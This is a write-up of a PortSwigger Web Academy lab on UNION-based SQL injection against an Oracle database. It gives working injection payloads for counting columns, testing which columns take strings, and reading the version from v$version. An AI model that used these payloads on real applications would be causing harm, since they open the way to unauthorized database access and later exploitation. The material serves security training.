# SQL Injection — Querying Database Version on Oracle

**Platform:** PortSwigger Web Academy  
**Category:** SQL Injection — Examining the Database  
**Difficulty:** Practitioner  
**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle  

---

## Objective

Use a UNION-based SQL injection attack to retrieve the database version string from an Oracle database.

---

## Background

### UNION Attacks

Once a SQL injection point is confirmed, a UNION attack lets you append a second SELECT statement to the original query and retrieve data from other tables — or from database built-in functions.

For a UNION attack to work, three conditions must be met:

1. **Same number of columns** — your injected SELECT must return the same number of columns as the original query
2. **Compatible data types** — the columns must have compatible types (typically you need at least one string column)
3. **Results must be displayed** — the application must actually render the query results somewhere on the page

### Oracle-Specific Syntax

Oracle databases have two important differences from MySQL/PostgreSQL:

| Syntax | Oracle | Others |
|---|---|---|
| Version string | `SELECT * FROM v$version` | `SELECT @@version` / `SELECT version()` |
| Dummy table | `FROM dual` required | `FROM` clause optional |

In Oracle, every SELECT statement **must** include a FROM clause. The built-in `dual` table is a one-row dummy table used exactly for this purpose.

---

## Steps

### 1. Identify the injection point

The product category filter is injectable. A normal request:

```
GET /filter?category=Gifts
```

Test for injection by adding a single quote:

```
GET /filter?category=Gifts'
```

If the page throws a database error or returns unexpected output — the parameter is injectable.

---

### 2. Determine the number of columns

Use ORDER BY to probe column count. Increment the number until the page throws an error:

```
GET /filter?category=Gifts' ORDER BY 1--
GET /filter?category=Gifts' ORDER BY 2--
GET /filter?category=Gifts' ORDER BY 3--   ← error here means 2 columns
```

When `ORDER BY 3` causes an error, the original query returns **2 columns**.

Alternatively, use NULL-based UNION probing (required for Oracle since `dual` is needed):

```
GET /filter?category=Gifts' UNION SELECT NULL,NULL FROM dual--
```

If this returns results without error — 2 columns confirmed.

---

### 3. Find a string-compatible column

Check which columns accept string data:

```
GET /filter?category=Gifts' UNION SELECT 'test',NULL FROM dual--
GET /filter?category=Gifts' UNION SELECT NULL,'test' FROM dual--
```

Whichever one renders `test` on the page is your string column. In this lab, both columns typically accept strings.

---

### 4. Extract the Oracle version

Oracle stores version information in the `v$version` view. Query it:

```
GET /filter?category=Gifts' UNION SELECT banner,NULL FROM v$version--
```

The page will display output like:

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
```

The database version string is retrieved and the lab is solved.

---

## Full Payload Summary

```sql
-- Step 1: Confirm injectable
Gifts'

-- Step 2: Count columns
Gifts' ORDER BY 2--

-- Step 3: Confirm UNION works (Oracle requires FROM dual)
Gifts' UNION SELECT NULL,NULL FROM dual--

-- Step 4: Extract version
Gifts' UNION SELECT banner,NULL FROM v$version--
```

---

## Why This Works

The original query is something like:

```sql
SELECT name, description FROM products WHERE category = '<input>' AND released = 1
```

After injection:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION
SELECT banner, NULL FROM v$version--' AND released = 1
```

The UNION appends a second result set. The `v$version` view is a system view readable by default in Oracle — no special privileges needed. Its `banner` column contains the full version string, which gets returned alongside the normal product rows.

---

## Key Takeaway

> **Database version disclosure is the first step in targeted exploitation.** Knowing the exact version lets an attacker look up known CVEs for that specific release. In a real assessment, version enumeration comes immediately after confirming injection — it shapes everything that follows.

---

## References

- [PortSwigger SQL injection — examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [Oracle v$version documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/V-VERSION.html)
- [PortSwigger SQL injection cheat sheet — Oracle](https://portswigger.net/web-security/sql-injection/cheat-sheet)
